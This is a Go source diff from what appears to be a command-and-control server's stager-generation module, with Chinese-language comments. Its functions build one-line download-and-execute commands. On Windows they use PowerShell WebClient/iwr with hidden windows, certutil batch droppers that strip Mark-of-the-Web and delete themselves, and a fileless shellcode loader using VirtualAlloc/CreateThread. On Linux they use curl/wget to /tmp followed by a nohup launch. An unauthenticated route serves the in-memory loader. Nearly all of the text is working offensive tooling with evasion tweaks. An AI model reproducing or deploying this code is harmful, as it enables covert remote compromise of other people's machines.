@@ -80,21 +80,9 @@ func stagerCacheLoad(id string) (StagerConfig, bool) {
 	return e.cfg, true
 }
 
+// Build log WS is browser-only — use AdminCheckOrigin (empty Origin rejected).
 var upgrader_gen = websocket.Upgrader{
-	CheckOrigin: func(r *http.Request) bool {
-		origin := r.Header.Get("Origin")
-		if origin == "" {
-			return true
-		}
-		if strings.Contains(origin, "localhost") || strings.Contains(origin, "127.0.0.1") {
-			return true
-		}
-		host := r.Host
-		if host != "" && strings.Contains(origin, host) {
-			return true
-		}
-		return false
-	},
+	CheckOrigin: globals.AdminCheckOrigin,
 }
 
 // Product client types (UI / API "profile" field) — two directions, SAME capability:
@@ -568,35 +556,66 @@ func HandleGetStager(c *gin.Context) {
 
 	if osType == "windows" && delivery == "fileless" {
 		// Fileless: patch Stage0 PE → Donut PIC → cache as stage2; return fetch URL + PS loader
+		// Note: arch for Donut — map UI amd64 → x64
+		donutArch := "x64"
+		if arch == "x86" {
+			donutArch = "x86"
+		}
 		stage2ID, stage2URL, stage2Len, ferr := buildAndCacheFilelessStage2(
-			c, listenerID, callbackHost, "x64", profile, httpProto, downloadHost,
+			c, listenerID, callbackHost, donutArch, profile, httpProto, downloadHost,
 		)
 		if ferr != nil {
-			c.JSON(500, gin.H{"error": "fileless stage2: " + ferr.Error(), "delivery": "fileless"})
+			c.JSON(500, gin.H{
+				"error":    "fileless stage2: " + ferr.Error(),
+				"delivery": "fileless",
+				"hint":     "确认 assets/ 下存在 client_template_* 且监听器在线；杀软可能拦截 Donut 打包过程",
+			})
 			return
 		}
-		// PowerShell lab loader: download raw stage2 PIC → AllocHGlobal → CreateThread
-		psCommand := fmt.Sprintf(
-			`powershell -nop -w hidden -c "$u='%s';$f=Join-Path $env:TEMP ('s2_'+[guid]::NewGuid().ToString('n'));iwr -UseBasicParsing $u -OutFile $f;$b=[IO.File]::ReadAllBytes($f);Remove-Item $f -Force -EA 0;$m=[Runtime.InteropServices.Marshal];$p=$m::AllocHGlobal($b.Length);$m::Copy($b,0,$p,$b.Length);$t=Add-Type -MemberDefinition '[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport(\"kernel32\")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name T -PassThru;$h=$t::CreateThread(0,0,$p,0,0,0);$t::WaitForSingleObject($h,0xFFFFFFFF)"`,
-			stage2URL,
-		)
-		// Stager env form (cupcake-stager uses CUPCAKE_STAGE2_URL)
-		command := fmt.Sprintf(
-			`set CUPCAKE_STAGE2_URL=%s&& cupcake-stager.exe`,
-			stage2URL,
-		)
+		// Short one-liner: iex(iwr loader) — loader body served at /api/s/l/:id
+		loaderURL := fmt.Sprintf("%s://%s/api/s/l/%s", httpProto, downloadHost, stage2ID)
+		psCommand := buildFilelessIEXCommand(loaderURL)
+		psInlineCommand := buildFilelessPSCommand(stage2URL) // 不走外链的内联回退
+		stagerCmd := buildFilelessStagerCommand(stage2URL)
+		expiresAt := time.Now().Add(10 * time.Minute).UTC().Format(time.RFC3339)
 		c.JSON(200, gin.H{
-			"id":             stage2ID,
-			"delivery":       "fileless",
-			"command":        command,
-			"command_ps":     psCommand,
-			"download":       stage2URL,
-			"stage2_url":     stage2URL,
-			"stage2_bytes":   stage2Len,
-			"callback":       callbackHost,
-			"profile":        product,
-			"profile_label":  profileProductLabel(product) + " · fileless",
-			"panel_host":     downloadHost,
+			"id":                stage2ID,
+			"delivery":          "fileless",
+			"delivery_label":    "内存上线",
+			"command":           psCommand, // 默认推荐：最短 IEX 外链
+			"command_ps":        psCommand,
+			"command_ps_inline": psInlineCommand,
+			"command_stager":    stagerCmd,
+			"command_primary":   "ps",
+			"download":          stage2URL,
+			"loader_url":        loaderURL,
+			"stage2_url":        stage2URL,
+			"stage2_bytes":       stage2Len,
+			"stage2_ttl_sec":    600,
+			"expires_at":         expiresAt,
+			"callback":           callbackHost,
+			"profile":            product,
+			"profile_label":      profileProductLabel(product) + " · 内存上线",
+			"panel_host":         downloadHost,
+			"arch":               donutArch,
+			"recommended":       "command_ps",
+			"notes": []string{
+				"推荐复制「PowerShell」：iex(iwr loader) 一行执行，loader 由面板临时下发（约 10 分钟有效）。",
+				"「内联」是把 P/Invoke 整段塞进命令体，不依赖 loader 路由，命令最长但无二次请求。",
+				"Stage2 URL 约 10 分钟有效，过期请点刷新重新生成。",
+				"cupcake-stager 需事先放到目标目录；签名更响，仅实验室。",
+				"内存上线 ≠ BOF；上线后的 BOF 走 iso_host。",
+			},
+		})
+		return
+	}
+
+	// Linux has no fileless PIC path yet
+	if delivery == "fileless" && osType != "windows" {
+		c.JSON(400, gin.H{
+			"error":    "fileless 目前仅支持 Windows",
+			"delivery": "fileless",
+			"hint":     "Linux 请使用 delivery=disk",
 		})
 		return
 	}
@@ -623,29 +642,34 @@ func HandleGetStager(c *gin.Context) {
 			Extra: fmt.Sprintf("%s|%s", url64, url32),
 		})
 
-		// 单行 certutil：先拉 bat（架构分流），再执行
 		batURL := fmt.Sprintf("%s://%s/api/s/%s", httpProto, downloadHost, batID)
-		command := fmt.Sprintf(
-			`certutil -urlcache -split -f "%s" "%%TEMP%%\c2s.bat" >nul 2>&1 & call "%%TEMP%%\c2s.bat"`,
-			batURL,
-		)
-
-		// PowerShell 备选（部分环境禁用 certutil 缓存）
-		psCommand := fmt.Sprintf(
-			`powershell -nop -w hidden -c "iwr -UseBasicParsing '%s' -OutFile $env:TEMP\c2s.bat; & $env:TEMP\c2s.bat"`,
-			batURL,
-		)
+		// 推荐：PS 直拉 x64 EXE（最短）；CMD/bat 为 certutil 被禁/32 位环境的备选
+		psCommand := buildDiskPSCommand(url64) // 默认推荐 x64 直链
+		cmdCommand := buildDiskCmdCommand(batURL)
+		psBatCommand := buildDiskPSBatCommand(batURL)
 
 		c.JSON(200, gin.H{
-			"id":            batID,
-			"delivery":      "disk",
-			"command":       command,
-			"command_ps":    psCommand,
-			"download":      batURL,
-			"callback":      callbackHost,
-			"profile":       product,
-			"profile_label": profileProductLabel(product),
-			"panel_host":    downloadHost,
+			"id":              batID,
+			"delivery":        "disk",
+			"delivery_label":  "落盘 EXE",
+			"command":         psCommand, // 默认推荐：PS 直拉 x64 最短路径
+			"command_cmd":     cmdCommand,
+			"command_ps":      psCommand,
+			"command_ps_bat":  psBatCommand,
+			"command_primary": "ps",
+			"download":        batURL,
+			"download_x64":    url64,
+			"download_x86":    url32,
+			"callback":        callbackHost,
+			"profile":         product,
+			"profile_label":   profileProductLabel(product),
+			"panel_host":      downloadHost,
+			"recommended":     "command_ps",
+			"notes": []string{
+				"推荐复制「PS 直拉」：WebClient 拉 x64 EXE → 隐藏启动，命令最短。",
+				"「CMD」用 certutil 拉 bat 自动分 x64/x86，兼容 32 位目标。",
+				"「PS+bat」与 CMD 等价，适合禁用 certutil 的环境（拉 bat + 调用）。",
+			},
 		})
 		return
 	}
@@ -662,26 +686,78 @@ func HandleGetStager(c *gin.Context) {
 	baseURL := fmt.Sprintf("%s://%s/api/s/%s", httpProto, downloadHost, id)
 	// 拉二进制并后台执行；用 /api/s/bin 更稳（纯 bin，不依赖 polyglot）
 	binURL := fmt.Sprintf("%s://%s/api/s/bin/%s", httpProto, downloadHost, id)
-	command := fmt.Sprintf(
-		`(curl -fsSL -m180 '%s'||wget -T180 -qO- '%s') -o /tmp/.x 2>/dev/null; curl -fsSL -m180 '%s' -o /tmp/.x 2>/dev/null||wget -T180 -q '%s' -O /tmp/.x; chmod +x /tmp/.x; (nohup /tmp/.x >/dev/null 2>&1 &); sleep 1; rm -f /tmp/.x`,
-		binURL, binURL, binURL, binURL,
-	)
-	// 更干净的一条
-	command = fmt.Sprintf(
-		`f=/tmp/.$(date +%%s); (curl -fsSL -m180 '%s' -o "$f"||wget -T180 -q '%s' -O "$f")&&chmod +x "$f"&&(nohup "$f" >/dev/null 2>&1 &)&&sleep 1&&rm -f "$f"`,
-		binURL, binURL,
-	)
+	command := buildLinuxDiskCommand(binURL)
 
 	c.JSON(200, gin.H{
-		"id":            id,
-		"command":       command,
-		"download":      baseURL,
-		"binary":        binURL,
-		"callback":      callbackHost,
-		"profile":       product,
-		"profile_label": profileProductLabel(product),
-		"panel_host":    downloadHost,
+		"id":             id,
+		"delivery":       "disk",
+		"delivery_label": "落盘 ELF",
+		"command":        command,
+		"command_cmd":    command,
+		"download":       baseURL,
+		"binary":         binURL,
+		"callback":       callbackHost,
+		"profile":        product,
+		"profile_label":  profileProductLabel(product),
+		"panel_host":     downloadHost,
+		"recommended":    "command",
+		"notes": []string{
+			"curl/wget 下载到 /tmp 随机名 → 后台执行 → 删除文件（进程仍在跑）。",
+		},
 	})
+}
+
+// --- one-click stager command builders (keep short, copy-paste friendly) ---
+
+func buildDiskCmdCommand(batURL string) string {
+	// 单行：certutil 拉 bat → call → 删 bat（bat 内再拉 EXE 并自删）
+	return fmt.Sprintf(
+		`cmd /c "set B=%%TEMP%%\u%%RANDOM%%.bat&certutil -urlcache -split -f "%s" %%B%% >nul 2>&1&call %%B%%&del /f /q %%B%% >nul 2>&1"`,
+		batURL,
+	)
+}
+
+func buildDiskPSCommand(exeURL string) string {
+	// 直拉 x64 EXE，最短路径（推荐 64 位目标）；固定名 u.exe 覆盖即可，一次性 stager
+	return fmt.Sprintf(
+		`powershell -nop -w h -c "$p=\"$env:TEMP\u.exe\";(New-Object Net.WebClient).DownloadFile('%s',$p);Start-Process -FilePath $p -WindowStyle Hidden"`,
+		exeURL,
+	)
+}
+
+func buildDiskPSBatCommand(batURL string) string {
+	return fmt.Sprintf(
+		`powershell -nop -w h -c "$p=Join-Path $env:TEMP ('u'+[guid]::NewGuid().ToString('n').Substring(0,8)+'.bat');(New-Object Net.WebClient).DownloadFile('%s',$p);& $p;Remove-Item $p -Force -EA 0"`,
+		batURL,
+	)
+}
+
+func buildLinuxDiskCommand(binURL string) string {
+	return fmt.Sprintf(
+		`f=/tmp/.u$RANDOM$RANDOM; (curl -fsSL -m180 '%s' -o "$f"||wget -T180 -q '%s' -O "$f")&&chmod +x "$f"&&(nohup "$f" >/dev/null 2>&1 &)& sleep 1; rm -f "$f"`,
+		binURL, binURL,
+	)
+}
+
+// buildFilelessPSCommand: true in-memory (DownloadData → VirtualAlloc → CreateThread), no stage2 on disk.
+// Inline version kept as a fallback for environments that cannot fetch the /api/s/l loader script.
+func buildFilelessPSCommand(stage2URL string) string {
+	// Compact single-line; WebClient.DownloadData avoids temp shellcode file.
+	return fmt.Sprintf(
+		`powershell -nop -w h -c "$b=(New-Object Net.WebClient).DownloadData('%s');$c=Add-Type -MemberDefinition '[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport(\"kernel32\")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name W -PassThru;$m=$c::VirtualAlloc(0,$b.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$c::WaitForSingleObject($c::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)"`,
+		stage2URL,
+	)
+}
+
+// buildFilelessIEXCommand is the short one-liner: fetch the loader PS body from
+// /api/s/l/:id via iwr and iex it in-memory. The loader body is the same
+// VirtualAlloc/CreateThread P/Invoke as buildFilelessPSCommand.
+func buildFilelessIEXCommand(loaderURL string) string {
+	return fmt.Sprintf(`powershell -nop -w h -c "iex(iwr -UseBasicParsing '%s')"`, loaderURL)
+}
+
+func buildFilelessStagerCommand(stage2URL string) string {
+	return fmt.Sprintf(`set "CUPCAKE_STAGE2_URL=%s" && cupcake-stager.exe`, stage2URL)
 }
 
 func HandleServePayload(c *gin.Context) {
@@ -704,19 +780,11 @@ func HandleServePayload(c *gin.Context) {
 
 		// Note: in bat files, %TEMP% is correct; when we fmt.Sprintf we must escape % as %%
 		// Zone.Identifier strip reduces MotW SmartScreen prompts for downloaded binaries (not a bypass of signatures).
+		// Neutral names; strip MotW; self-delete bat
 		bat := fmt.Sprintf(`@echo off
-set "OUT=%%TEMP%%\svc_%%RANDOM%%.exe"
-if /I "%%PROCESSOR_ARCHITECTURE%%"=="AMD64" (
-  certutil.exe -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1
-) else if /I "%%PROCESSOR_ARCHITEW6432%%"=="AMD64" (
-  certutil.exe -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1
-) else (
-  certutil.exe -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1
-)
-if exist "%%OUT%%" (
-  del /f /q "%%OUT%%:Zone.Identifier" >nul 2>&1
-  start "" /b "%%OUT%%"
-)
+set "OUT=%%LOCALAPPDATA%%\Microsoft\Windows\INetCache\~DF%%RANDOM%%%%RANDOM%%.tmp"
+if /I "%%PROCESSOR_ARCHITECTURE%%"=="AMD64" (certutil -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1) else if /I "%%PROCESSOR_ARCHITEW6432%%"=="AMD64" (certutil -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1) else (certutil -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1)
+if exist "%%OUT%%" (del /f /q "%%OUT%%:Zone.Identifier" >nul 2>&1 & start "" /b "%%OUT%%")
 del /f /q "%%~f0" >nul 2>&1
 `, url64, url64, url32)
 
@@ -1007,6 +1075,49 @@ func HandleServeStage2(c *gin.Context) {
 	c.Header("Content-Disposition", "attachment; filename=stage2.bin")
 	c.Header("Cache-Control", "no-store")
 	c.Data(200, "application/octet-stream", body)
+}
+
+// filelessLoaderScript is the PS body served at /api/s/l/:id — the same in-memory
+// VirtualAlloc/CreateThread P/Invoke logic as buildFilelessPSCommand, but as a
+// standalone script fetched by the short `powershell -c "iex(iwr URL)"' one-liner.
+func filelessLoaderScript(stage2URL string) string {
+	// Single quoted PS string; stage2URL has no single quotes (it's a server-built URL).
+	return fmt.Sprintf(`$b=(New-Object Net.WebClient).DownloadData('%s')
+$c=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name W -PassThru
+$m=$c::VirtualAlloc(0,$b.Length,0x3000,0x40)
+[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)
+$c::WaitForSingleObject($c::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)
+`, stage2URL)
+}
+
+// HandleServeFilelessLoader serves a PS loader script for the short one-click command.
+// Route is public (under /api/s/l/:id, already auth-exempt). Returns 404 when the
+// stager id is unknown/expired so the operator must regenerate the command.
+func HandleServeFilelessLoader(c *gin.Context) {
+	id := c.Param("id")
+	if id == "" || strings.Contains(id, "..") || strings.Contains(id, "/") {
+		c.Data(400, "text/plain", []byte("bad id"))
+		return
+	}
+	conf, ok := stagerCacheLoad(id)
+	if !ok || conf.Delivery != "fileless" || conf.Stage2ID == "" {
+		c.Data(404, "text/plain", []byte("stager id expired or unknown — regenerate one-click command in the panel"))
+		return
+	}
+	// Verify stage2 still cached (TTL enforced by services.LoadStage2).
+	if _, _, err := services.LoadStage2(conf.Stage2ID); err != nil {
+		c.Data(404, "text/plain", []byte("stage2 expired — regenerate one-click command in the panel"))
+		return
+	}
+	// Rebuild stage2 URL from current request (host/proto may differ from generate time).
+	proto := "http"
+	if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
+		proto = "https"
+	}
+	stage2URL := fmt.Sprintf("%s://%s/api/stage2/%s", proto, c.Request.Host, conf.Stage2ID)
+	c.Header("Content-Type", "text/plain; charset=utf-8")
+	c.Header("Cache-Control", "no-store")
+	c.Data(200, "text/plain; charset=utf-8", []byte(filelessLoaderScript(stage2URL)))
 }
 
 // HandleServeProtectedPayload: 受保护的 Payload 下载接口（替代 Static("/downloads")）
